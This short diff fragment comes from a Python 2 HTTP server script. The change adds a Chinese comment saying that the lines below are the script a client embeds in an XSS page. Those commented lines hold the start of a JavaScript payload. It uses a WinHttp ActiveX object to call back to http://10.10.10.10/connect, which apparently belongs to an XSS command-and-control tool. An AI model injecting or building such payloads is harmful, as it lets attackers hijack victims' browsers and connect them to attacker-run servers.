@@ -1,7 +1,7 @@
 import os
 from threading import Thread
 from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
-
+#客户端嵌入到xss页面的脚本
 #<script language="javascript" type="text/javascript">
 #h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 #h.Open("GET","http://10.10.10.10/connect",false);
